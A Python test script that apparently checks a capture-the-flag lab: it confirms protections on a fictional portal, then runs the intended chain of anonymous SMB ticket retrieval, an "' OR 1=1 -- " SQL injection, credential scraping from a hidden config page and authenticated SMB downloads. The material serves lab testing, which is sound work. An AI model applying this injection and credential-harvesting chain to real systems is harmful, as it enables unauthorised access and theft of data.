import html
import http.cookiejar
import re
import subprocess
import tempfile
from pathlib import Path
from urllib.error import HTTPError
from urllib.parse import urlencode
from urllib.request import Request, build_opener, HTTPCookieProcessor

public = 'http://kaiiki-hozen.local'
portal = public + ':8080'
opener = build_opener(HTTPCookieProcessor(http.cookiejar.CookieJar()))
def read(url, form=None):
    return opener.open(Request(url, data=None if form is None else urlencode(form).encode())).read().decode()
def denied(url, form=None, code=401):
    try:
        read(url, form)
        raise AssertionError('Access should have failed')
    except HTTPError as error:
        assert error.code == code

assert '南方第3点' in read(public)
assert 'A-07' in read(public + '/archive/')
for route in ('/login', '/logout', '/search', '/documents/a-07'):
    denied(public + route, code=404)
denied(portal + '/archive/', code=404)
assert '閲覧コード' in read(portal)
payload = "' OR 1=1 -- "
denied(portal + '/search', {'keyword': payload})
denied(portal + '/login', {'code': payload})
denied(portal + '/login', {'username': 'katayanagi', 'password': 'Katayanagi2021'})

guest_share = '//kaiiki-hozen.local/handover'
assert subprocess.run(['smbclient', guest_share, '-N', '-c', 'ls'], capture_output=True).returncode == 0
with tempfile.TemporaryDirectory(prefix='ch4-handover-') as tmp:
    ticket_file = Path(tmp) / 'seat-03.txt'
    fetched = subprocess.run(['smbclient', guest_share, '-N', '-c', f'get catalog/seat-03.txt {ticket_file}'], capture_output=True, text=True)
    assert fetched.returncode == 0 and ticket_file.exists(), fetched.stderr
    code = re.search(r'閲覧コード：([^\s]+)', ticket_file.read_text()).group(1)
assert code not in read(public) + read(public + '/archive/')
page = read(portal + '/login', {'code': code})
assert 'katayanagi' in page and 'transfer-settings' not in page
assert 'transfer-settings' not in read(portal + '/search', {'keyword': '%', 'scope': '非公開'})
denied(portal + '/documents/transfer-settings', code=404)
results = read(portal + '/search', {'keyword': payload})
links = re.findall(r'href="(/documents/[^"]+)"', results)
assert len(links) == 18
assert '25:00' not in results
config_link = next(link for link in links if 'transfer-settings' in link)
config = html.unescape(read(portal + config_link.replace('&amp;', '&')))
values = dict(re.findall(r'^(server|share|username|password) = ([^\n<]+)', config, flags=re.M))
assert set(values) == {'server', 'share', 'username', 'password'}
remote = f'//{values["server"]}/{values["share"]}'
auth = f'{values["username"]}%{values["password"]}'
def smb(options, command):
    return subprocess.run(['smbclient', remote, *options, '-c', command], capture_output=True, text=True)
assert smb(['-N'], 'ls').returncode != 0
assert smb(['-U', values['username'] + '%wrong'], 'ls').returncode != 0
assert smb(['-U', auth], 'ls').returncode == 0
with tempfile.TemporaryDirectory(prefix='ch4-evidence-') as tmp:
    for file in ['README.txt', '01_transport/intake.txt', '01_transport/dispatch.txt', '02_site/entrances.txt']:
        local = Path(tmp) / Path(file).name
        result = smb(['-U', auth], f'get {file} {local}')
        assert result.returncode == 0 and local.exists(), result.stderr
    assert '9月2日 | 12歳' in (Path(tmp)/'intake.txt').read_text()
    assert '25:00 | M-2 | 確定' in (Path(tmp)/'dispatch.txt').read_text()
    assert 'M-2：裏手の荷捌き所' in (Path(tmp)/'entrances.txt').read_text()
    probe = Path(tmp)/'write-test.txt'; probe.write_text('read-only check')
    refused = smb(['-U', auth], f'put {probe} write-test.txt')
    assert 'NT_STATUS_ACCESS_DENIED' in refused.stdout + refused.stderr
read(portal + '/logout', {})
denied(portal + '/search', {'keyword': payload})
print('PASS: nmap -> anonymous SMB ticket -> catalog -> SQLi -> authenticated SMB -> evidence joins')
print('PASS: unauthenticated search, previous password rule, login SQLi, direct document access, anonymous/wrong protected SMB, writes rejected')
